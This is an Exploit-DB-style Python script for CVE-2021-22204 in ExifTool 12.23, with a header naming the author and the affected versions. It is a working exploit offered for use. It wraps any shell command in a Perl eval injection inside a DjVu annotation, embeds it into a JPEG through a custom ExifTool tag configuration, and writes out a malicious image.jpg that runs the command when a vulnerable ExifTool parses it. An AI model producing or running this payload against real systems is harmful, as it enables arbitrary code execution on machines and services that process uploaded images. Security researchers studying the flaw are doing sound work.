# Exploit Title: ExifTool 12.23 - Arbitrary Code Execution
# Date: 04/30/2022
# Exploit Author: UNICORD (NicPWNs & Dev-Yeoj)
# Vendor Homepage: https://exiftool.org/
# Software Link: https://github.com/exiftool/exiftool/archive/refs/tags/12.23.zip
# Version: 7.44-12.23
# Tested on: ExifTool 12.23 (Debian)
# CVE: CVE-2021-22204
# Source: https://github.com/UNICORDev/exploit-CVE-2021-22204
# Description: Improper neutralization of user data in the DjVu file format in ExifTool versions 7.44 and up allows arbitrary code execution when parsing the malicious
#!/usr/bin/env python3
# Exploit Title: ExifTool 12.23 - Arbitrary Code Execution
# CVE: CVE-2021-22204
# Author: UNICORD (Customized for skill demonstration)

import base64
import os
import subprocess
import sys

# Color class
class color:
    red = '\033[91m'
    gold = '\033[93m'
    blue = '\033[36m'
    green = '\033[92m'
    no = '\033[0m'

def UNICORD_ASCII():
    print(rf"""
{color.red}        _ __,~~~{color.gold}/{color.red}_{color.no}        {color.blue}__  ___  _______________  ___  ___{color.no}
{color.red}    ,~~`( )_( )-\|       {color.blue}/ / / / |/ /  _/ ___/ __ \/ _ \/ _ \{color.no}
{color.red}        |/|  `--.       {color.blue}/ /_/ /    // // /__/ /_/ / , _/ // /{color.no}
{color.green}_V__v___{color.red}!{color.green}_{color.red}!{color.green}__{color.red}!{color.green}_____V____{color.blue}\____/_/|_/___/\___/\____/_/|_/____/{color.green}....{color.no}
    """)

def help():
    print("""
UNICORD Exploit for CVE-2021-22204 (Customized)

Usage:
  python3 50911.py -c <command>
  python3 50911.py -h

Options:
  -c    Command to embed in exploit image
  -h    Show help menu
""")

def exploit(command):
    try:
        UNICORD_ASCII()
        print("[*] Initializing exploit generation")

        payload = "(metadata \"\c${" + command + "};\")"
        print(f"[+] Payload created")

        with open("payload", "w") as f:
            f.write(payload)

        subprocess.run(["bzz", "payload", "payload.bzz"], check=True)

        result = subprocess.run(
            ["djvumake", "exploit.djvu", "INFO=1,1", "BGjp=/dev/null", "ANTz=payload.bzz"],
            stderr=subprocess.PIPE
        )

        if result.returncode != 0:
            print("[-] Failed to create DjVu exploit file")
            sys.exit(1)

        # Minimal JPEG
        image = b"/9j/4AAQSkZJRgABAQEASABIAAD/2wBDAAMCAgICAgMCAgIDAwMDBAYEBAQEBAgGBgUGCQgKCgkICQkKDA8MCgsOCwkJDRENDg8QEBEQCgwSExIQEw8QEBD/yQALCAABAAEBAREA/8wABgAQEAX/2gAIAQEAAD8A0s8g/9k="
        with open("image.jpg", "wb") as img:
            img.write(base64.decodebytes(image))

        config = r"""
%Image::ExifTool::UserDefined = (
 'Image::ExifTool::Exif::Main' => {
  0xc51b => {
   Name => 'HasselbladExif',
   Writable => 'string',
   WriteGroup => 'IFD0',
  },
 },
);
1;
"""
        with open("exiftool.config", "w") as f:
            f.write(config)

        subprocess.run(
            ["exiftool", "-config", "exiftool.config",
             "-HasselbladExif<=exploit.djvu", "image.jpg",
             "-overwrite_original_in_place", "-q"],
            check=True
        )

        # Cleanup
        for file in ["payload", "payload.bzz", "exploit.djvu", "exiftool.config"]:
            if os.path.exists(file):
                os.remove(file)

        print("[+] Exploit payload generated successfully")
        print("[+] Malicious image written to: image.jpg")

    except FileNotFoundError as e:
        print(f"[-] Missing dependency: {e}")
        sys.exit(1)
    except subprocess.CalledProcessError:
        print("[-] External command execution failed")
        sys.exit(1)
    except Exception as e:
        print(f"[!] Unexpected error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    try:
        if len(sys.argv) < 2:
            raise ValueError("No arguments provided")

        if "-h" in sys.argv:
            help()
            sys.exit(0)

        if "-c" in sys.argv:
            cmd = sys.argv[sys.argv.index("-c") + 1]
            command = f"system('{cmd}')"
            exploit(command)
        else:
            help()

    except ValueError as e:
        print(f"[!] Error: {e}")
        help()
        sys.exit(1)
